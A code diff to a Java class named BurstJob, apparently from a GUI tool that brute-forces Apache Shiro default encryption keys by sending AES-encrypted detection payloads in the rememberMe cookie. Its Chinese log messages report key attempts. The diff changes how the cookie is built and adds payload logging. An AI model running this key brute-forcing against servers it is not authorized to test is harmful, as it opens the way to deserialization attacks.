@@ -41,15 +41,16 @@ public class BurstJob implements Callable<String> {
         try {
             Controller.logUtil.printInfoLog("开始爆破默认key");
             //错误包长度
-
             Map<String, Object> header = (Map<String, Object>)paramsContext.get("header");
             if (header==null){
                 header = new HashMap<>();
             }
+            Object oldCookie = null;
             //在原有cookie后面追加
             if (header.get("cookie")!=null){
+                oldCookie = header.get("cookie");
                 if (!header.get("cookie").toString().contains(paramsContext.get("rmeValue").toString())){
-                    header.put("cookie",header.get("cookie")+";"+paramsContext.get("rmeValue")+"=123456");
+                    header.put("cookie",oldCookie+";"+paramsContext.get("rmeValue")+"=123456");
                 }
             }else {
                 header.put("cookie",paramsContext.get("rmeValue")+"=123456");
@@ -65,8 +66,19 @@ public class BurstJob implements Callable<String> {
                     encryptData = PayloadEncryptTool.AesCbcEncrypt(ShiroTool.getDetectText(),key);
                 }
 
-                header.put("cookie",header.get("cookie")+";"+paramsContext.get("rmeValue")+"="+encryptData);
-                String data="";
+                if (controller.isShowPayload.isSelected()){
+                    Controller.logUtil.printInfoLog(encryptData);
+                    Controller.logUtil.printInfoLog(encryptData.length()+"");
+                }
+                //请求包header超过8k会报header too large错误
+                if (oldCookie!=null){
+                    header.put("cookie",oldCookie+";"+paramsContext.get("rmeValue")+"="+encryptData);
+                }else {
+                    header.put("cookie",paramsContext.get("rmeValue")+"="+encryptData);
+                }
+
+                //System.out.println(header.get("cookie"));
+                String data;
                 if(paramsContext.get("method").equals(Constants.METHOD_GET)){
                     data = HttpClientUtil.httpGetRequest(url,header);
                 }else {
@@ -80,9 +92,9 @@ public class BurstJob implements Callable<String> {
                 }else {
                     Controller.logUtil.printAbortedLog("秘钥错误");
                 }
-
                 i++;
             }
+            Controller.logUtil.printAbortedLog("爆破结束！未发现默认秘钥！");
         }catch (Exception e){
             e.printStackTrace();
         }finally {
